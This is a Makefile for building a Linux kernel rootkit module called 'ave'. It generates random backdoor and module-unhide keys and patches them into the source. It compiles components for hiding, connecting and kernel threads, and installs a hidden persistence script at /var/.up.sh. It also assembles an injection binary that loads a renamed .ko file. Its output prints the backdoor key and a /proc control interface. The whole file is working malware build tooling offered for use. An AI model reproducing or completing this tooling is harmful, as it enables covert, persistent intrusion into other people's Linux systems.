OBJNAME=ave

ifndef DEPLOY
DEBUG_PR := -DDEBUG_RING_BUFFER
endif
STRIP=$(shell which strip)
LD=$(shell which ld)
AS=$(shell which as)
CTAGS=$(shell which ctags)
JOURNALCTL := $(shell which journalctl)
UUIDGEN := $(shell uuidgen)

ifndef TEST_ENV
BDKEY := 0x$(shell od -vAn -N8 -tx8 < /dev/urandom | tr -d ' \n')
UNHIDEKEY := 0x$(shell od -vAn -N8 -tx8 < /dev/urandom | tr -d ' \n')
PRCTIMEOUT := 1200
else
BDKEY=0x7d3b1cb572f16425
UNHIDEKEY=0x2
PRCTIMEOUT := 120
endif

COMPILER_OPTIONS := -Wall -Wno-vla -DPROCNAME='"$(PROCNAME)"' \
	-DMODNAME='"ave"' -DKSOCKET_EMBEDDED ${DEBUG_PR} -DCPUHACK \
	-DCPUHACK -DPRCTIMEOUT=$(PRCTIMEOUT) -DUUIDGEN=\"$(UUIDGEN)\" \
	-DJOURNALCTL=\"$(JOURNALCTL)\" 

EXTRA_CFLAGS := -I$(src)/src -I$(src)/fs ${COMPILER_OPTIONS}

SRC := src/${OBJNAME}.c src/hidden.c src/ntfs.c src/main.c \
	src/connect.c src/shad.c src/kthread.c src/cipher.c src/memory.c

injection=src/injection

$(OBJNAME)-objs = $(SRC:.c=.o)

obj-m := ${OBJNAME}.o

CC=gcc

# Copy /var/.up.sh
prepare:
	mkdir -p /var/
	cp var/.up.sh /var/.up.sh
	chmod +x /var/.up.sh

all: prepare
	# TODO: Check if we can generate a random PROCNAME, something like:
	# PROCNAME ?= $(shell uuidgen | cut -c1-8)
	$(if $(PROCNAME),,$(error ERROR: PROCNAME is not defined. Please invoke make with PROCNAME="your_process_name"))
	@sed -i "s/\(uint64_t auto_bdkey = \)[^;]*;/\1$(BDKEY);/" src/connect.c
	@sed -i "s/\(uint64_t auto_unhidekey = \)[^;]*;/\1$(UNHIDEKEY);/" src/ave.c
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
	@echo -n "Backdoor KEY: "
	@echo "\033[1;37m$(BDKEY)\033[0m" | sed 's/0x//'
	@echo -n "LKM unhide KEY: "
	@echo "\033[1;37m$(UNHIDEKEY)\033[0m" | sed 's/0x//'
	@echo "UI: \033[1;37m/proc/$(PROCNAME)\033[0m"
	@echo -n "Build type: "
ifdef DEPLOY
	@echo "\033[1;37mRELEASE\033[0m"
else
	@echo "\033[1;37mDEBUG\033[0m"
endif

injection:
	sed -i "s|.av.ko|${UUIDGEN}.ko|g" $(injection).S
	sed -i "s|.up.sh|.up.sh|g" $(injection).S 
	$(AS) --64 $(injection).S -statistics -fatal-warnings \
		-size-check=error -o $(injection).o
	$(LD) -Ttext 200000 --oformat binary -o $(injection) $(injection).o

lgtm: injection
	make -C /lib/modules/$(shell dpkg --status linux-headers-generic |grep ^Depends| \
		cut -d ":" -f2| sed 's/ linux-headers-//g')/build M=$(PWD) modules

strip:
	$(STRIP) -v -g $(OBJNAME).ko

clang-format:
	clang-format-18 -i src/*.[ch]

reset-auto:
	@sed -i "s/\(uint64_t auto_bdkey = \)[^;]*;/\10x0000000000000000;/" src/connect.c
	@sed -i "s/\(uint64_t auto_unhidekey = \)[^;]*;/\10x0000000000000000;/" src/ave.c

clean: reset-auto
	@make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
	@rm -f *.o src/*.o $(injection)
	@echo "Clean."

tags:
	$(CTAGS) -RV src/.
